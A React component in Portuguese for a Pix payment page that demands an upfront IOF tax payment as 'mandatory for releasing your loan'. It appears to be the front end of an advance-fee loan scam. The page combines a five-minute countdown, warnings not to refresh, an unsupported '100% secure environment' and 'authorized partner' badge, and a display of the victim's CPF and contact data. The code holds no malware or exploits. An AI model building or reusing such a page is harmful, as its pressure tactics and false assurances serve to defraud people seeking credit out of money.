import React, { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";
import {
  Copy,
  CheckCircle,
  Clock,
  AlertCircle,
  XCircle,
  ShieldCheck,
  Lock,
} from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { Button } from "@/components/ui/button";
import { Separator } from "@/components/ui/separator";
import { cn } from "@/lib/utils";
import { formatCurrency } from "@/utils/formatters";

const statusConfig = {
  pending: {
    label: "Aguardando Pagamento",
    icon: Clock,
    color: "text-amber-500 bg-amber-50 border-amber-200",
  },
  paid: {
    label: "Pagamento Confirmado",
    icon: CheckCircle,
    color: "text-green-600 bg-green-50 border-green-200",
  },
  expired: {
    label: "Pagamento Expirado",
    icon: AlertCircle,
    color: "text-red-500 bg-red-50 border-red-200",
  },
  cancelled: {
    label: "Pagamento Cancelado",
    icon: XCircle,
    color: "text-gray-500 bg-gray-50 border-gray-200",
  },
};

const SESSION_DURATION_MINUTES = 5; // Página e QR code ficam disponíveis por 5 minutos
const SESSION_STORAGE_KEY = "pix_payment_session";

interface PixPaymentSession {
  sessionStartTime: number;
  pix: any;
  transactionId: string;
  iofValue: number;
  client: any;
  originalData: any;
}

const PixPaymentDetails = () => {
  const location = useLocation();
  const urlState = location.state || {};

  // Estados principais
  const [status, setStatus] = useState("pending");
  const [statusDesc, setStatusDesc] = useState("");
  const [timer, setTimer] = useState(SESSION_DURATION_MINUTES * 60);
  const [copied, setCopied] = useState(false);
  const [sessionData, setSessionData] = useState<PixPaymentSession | null>(
    null
  );

  // Função para salvar sessão no localStorage
  const saveSession = (data: PixPaymentSession) => {
    localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(data));
    setSessionData(data);
  };

  // Função para carregar sessão do localStorage
  const loadSession = (): PixPaymentSession | null => {
    try {
      const stored = localStorage.getItem(SESSION_STORAGE_KEY);
      if (stored) {
        const parsed = JSON.parse(stored);
        const now = Date.now();
        const sessionAge = (now - parsed.sessionStartTime) / 1000 / 60; // em minutos

        // Se a sessão ainda está válida (menos de 5 minutos)
        if (sessionAge < SESSION_DURATION_MINUTES) {
          return parsed;
        } else {
          // Sessão expirada, limpar
          localStorage.removeItem(SESSION_STORAGE_KEY);
        }
      }
    } catch (error) {
      console.error("Erro ao carregar sessão:", error);
      localStorage.removeItem(SESSION_STORAGE_KEY);
    }
    return null;
  };

  // Inicialização do componente
  useEffect(() => {
    let session = loadSession();

    // Se não há sessão salva, criar nova com dados da URL
    if (!session && (urlState.pix || urlState.transactionId)) {
      session = {
        sessionStartTime: Date.now(),
        pix: urlState.pix,
        transactionId: urlState.transactionId,
        iofValue: urlState.iofValue,
        client: urlState.client,
        originalData: urlState,
      };
      saveSession(session);
    }

    if (session) {
      setSessionData(session);

      // Calcular timer baseado no tempo da sessão
      const now = Date.now();
      const sessionAge = (now - session.sessionStartTime) / 1000; // em segundos
      const remainingTime = Math.max(
        0,
        SESSION_DURATION_MINUTES * 60 - sessionAge
      );

      setTimer(Math.floor(remainingTime));
    }
  }, []);

  // Timer da sessão
  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          // Sessão expirou
          localStorage.removeItem(SESSION_STORAGE_KEY);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  // Polling do status de pagamento
  useEffect(() => {
    if (!sessionData?.transactionId) return;

    const fetchStatus = async () => {
      try {
        const res = await fetch(
          `/api/pix-status?id=${sessionData.transactionId}`
        );
        const data = await res.json();

        if (data.status) {
          if (data.status === "PAID") {
            setStatus("paid");
            // Limpar sessão se pagamento foi confirmado
            localStorage.removeItem(SESSION_STORAGE_KEY);
          } else if (data.status === "EXPIRED") {
            setStatus("expired");
          } else if (data.status === "CANCELLED") {
            setStatus("cancelled");
          } else {
            setStatus("pending");
          }
        }

        if (data.statusDescription) {
          setStatusDesc(data.statusDescription);
        }
      } catch (error) {
        console.error("Erro ao verificar status:", error);
      }
    };

    fetchStatus();
    const statusInterval = setInterval(fetchStatus, 5000);

    return () => clearInterval(statusInterval);
  }, [sessionData?.transactionId]);

  // Função para formatar timer
  const formatTimer = (seconds: number) => {
    const min = Math.floor(seconds / 60)
      .toString()
      .padStart(2, "0");
    const sec = (seconds % 60).toString().padStart(2, "0");
    return `${min}:${sec}`;
  };

  // Função para copiar código PIX
  const handleCopyPixCode = async () => {
    try {
      await navigator.clipboard.writeText(sessionData?.pix?.code || "");
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error("Failed to copy text: ", err);
    }
  };

  // Se não há dados de sessão, mostrar erro
  if (!sessionData) {
    return (
      <div className="max-w-md mx-auto px-4 py-8">
        <Card className="bg-background overflow-hidden shadow-2xl rounded-2xl">
          <CardContent className="p-6 text-center">
            <AlertCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-bold text-red-600 mb-2">
              Sessão não encontrada
            </h2>
            <p className="text-gray-600">
              Não foi possível carregar os dados do pagamento. Por favor, inicie
              o processo novamente.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Se a sessão expirou
  if (timer <= 0) {
    return (
      <div className="max-w-md mx-auto px-4 py-8">
        <Card className="bg-background overflow-hidden shadow-2xl rounded-2xl">
          <CardContent className="p-6 text-center">
            <Clock className="w-16 h-16 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-bold text-red-600 mb-2">
              Tempo esgotado
            </h2>
            <p className="text-gray-600 mb-4">
              O tempo limite de 5 minutos para o pagamento foi atingido. O QR
              code expirou.
            </p>
            <Button
              onClick={() => (window.location.href = "/")}
              className="bg-green-600 hover:bg-green-700 text-white"
            >
              Voltar ao início
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  const StatusIcon = statusConfig[status].icon;

  return (
    <div className="max-w-md mx-auto px-4 py-8">
      <Card className="bg-background overflow-hidden shadow-2xl rounded-2xl">
        <div className="bg-green-600 py-4 px-6">
          <h1 className="text-white text-2xl font-bold text-center">
            Pagamento do IOF
          </h1>
        </div>
        <CardContent className="p-6 flex flex-col items-center">
          {/* Valor do IOF em destaque */}
          <div className="flex flex-col items-center mb-2">
            <span className="text-base text-green-800 font-semibold">
              Valor do IOF
            </span>
            <span className="text-3xl font-bold text-green-700">
              {Number(sessionData.iofValue).toLocaleString("pt-BR", {
                style: "currency",
                currency: "BRL",
              })}
            </span>
          </div>
          <p className="text-sm text-gray-700 text-center mb-4">
            Este é o valor do IOF referente à sua operação de crédito.
            <br />O pagamento é obrigatório para liberação do seu empréstimo.
          </p>

          {/* Aviso importante - NÃO ATUALIZAR */}
          <div className="bg-red-50 border-2 border-red-200 rounded-xl p-4 w-full mb-4">
            <div className="flex items-center gap-3 mb-2">
              <div className="flex-shrink-0">
                <AlertCircle className="w-6 h-6 text-red-600" />
              </div>
              <div className="flex-1">
                <h3 className="text-red-800 font-bold text-base">
                  ⚠️ ATENÇÃO: NÃO ATUALIZE ESTA PÁGINA!
                </h3>
              </div>
            </div>
            <div className="pl-9">
              <p className="text-red-700 text-sm font-medium">
                Se você atualizar ou sair desta página, terá que{" "}
                <strong>reiniciar todo o processo</strong> do empréstimo.
              </p>
              <p className="text-red-600 text-xs mt-1">
                Mantenha esta aba aberta até concluir o pagamento.
              </p>
            </div>
          </div>

          {/* Timer e status */}
          <div className="flex flex-col items-center mb-4">
            {status === "pending" && (
              <>
                <span className="text-xs text-gray-600 mb-1">
                  Tempo restante para pagamento
                </span>
                <span
                  className={cn(
                    "border rounded-lg py-1 px-3 text-lg font-bold",
                    timer <= 60
                      ? "bg-red-50 border-red-200 text-red-700"
                      : "bg-green-50 border-green-200 text-green-700"
                  )}
                >
                  {formatTimer(timer)}
                </span>
                {timer <= 60 && (
                  <p className="text-xs text-red-600 mt-1">
                    ⚠️ Tempo quase esgotado!
                  </p>
                )}
              </>
            )}
            {status === "paid" && (
              <span className="text-green-700 font-semibold flex items-center gap-1">
                <CheckCircle className="w-4 h-4" /> Pagamento confirmado!
              </span>
            )}
            {status === "expired" && (
              <span className="text-red-600 font-semibold">
                Pagamento expirado
              </span>
            )}
          </div>

          {/* QR Code */}
          <div className="bg-white p-4 rounded-xl border-2 border-green-200 shadow-sm mb-4">
            {sessionData.pix?.base64 ? (
              <img
                src={`data:image/png;base64,${sessionData.pix.base64}`}
                alt="QR Code Pix"
                className="w-48 h-48 object-contain"
              />
            ) : sessionData.pix?.image ? (
              <img
                src={sessionData.pix.image}
                alt="QR Code Pix"
                className="w-48 h-48 object-contain"
              />
            ) : null}
          </div>
          <p className="text-sm text-gray-500 text-center mb-2">
            Escaneie o QR Code com o aplicativo do seu banco
          </p>

          {/* Código Pix e botão copiar */}
          <div className="bg-green-50 p-4 rounded-lg border border-green-200 mb-2 w-full">
            <div className="flex justify-between items-center mb-2">
              <h3 className="font-medium text-green-800">Código Pix</h3>
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="sm"
                      className="h-8 border-green-300 hover:bg-green-100 hover:text-green-700"
                      onClick={handleCopyPixCode}
                      disabled={!sessionData.pix?.code}
                    >
                      {copied ? (
                        <CheckCircle className="mr-1 h-4 w-4 text-green-600" />
                      ) : (
                        <Copy className="mr-1 h-4 w-4" />
                      )}
                      {copied ? "Copiado!" : "Copiar"}
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>Copiar código Pix</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            </div>
            <div className="bg-white p-3 rounded border border-green-200 break-all text-sm font-mono">
              {sessionData.pix?.code || "Carregando..."}
            </div>
          </div>
          <p className="text-sm text-gray-500 mb-4">
            Ou copie o código acima e cole no aplicativo do seu banco
          </p>

          {/* Aviso sobre expiração */}
          <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 w-full mb-4">
            <div className="flex items-center gap-2 mb-1">
              <Clock className="w-4 h-4 text-amber-600" />
              <span className="text-amber-800 font-semibold text-sm">
                Atenção: Tempo Limitado
              </span>
            </div>
            <p className="text-xs text-amber-700">
              Esta página e o QR code são válidos por apenas 5 minutos. Após
              esse período, será necessário reiniciar o processo.
            </p>
          </div>

          {/* Seção de Segurança */}
          <div className="bg-green-50 border border-green-200 rounded-lg p-4 w-full flex flex-col items-center mb-4">
            <div className="flex items-center gap-2 mb-2">
              <Lock className="w-5 h-5 text-green-700" />
              <span className="text-green-800 font-semibold">
                Ambiente 100% Seguro
              </span>
            </div>
            <p className="text-xs text-green-700 text-center mb-1">
              Todas as informações são protegidas por criptografia e você está
              em um ambiente autorizado.
            </p>
            <p className="text-xs text-green-700 text-center mb-1">
              Nunca compartilhe seu código Pix com terceiros.
            </p>
            <div className="flex items-center gap-1 mt-2">
              <ShieldCheck className="w-4 h-4 text-green-600" />
              <span className="text-xs text-green-700 font-medium">
                Parceiro autorizado Axipayments
              </span>
            </div>
          </div>

          {/* Dados do cliente */}
          <div className="w-full mb-4">
            <h3 className="text-green-800 font-semibold mb-2 text-base">
              Seus dados
            </h3>
            <div className="text-sm text-gray-700">
              <div>
                <span className="font-medium">Nome:</span>{" "}
                {sessionData.client?.name}
              </div>
              <div>
                <span className="font-medium">CPF:</span>{" "}
                {sessionData.client?.cpf}
              </div>
              <div>
                <span className="font-medium">E-mail:</span>{" "}
                {sessionData.client?.email}
              </div>
              <div>
                <span className="font-medium">Telefone:</span>{" "}
                {sessionData.client?.phone}
              </div>
            </div>
          </div>

          <p className="text-xs text-gray-500 text-center mt-2">
            Após o pagamento do IOF, seu empréstimo será liberado
            automaticamente.
          </p>
        </CardContent>
      </Card>
    </div>
  );
};

export default PixPaymentDetails;
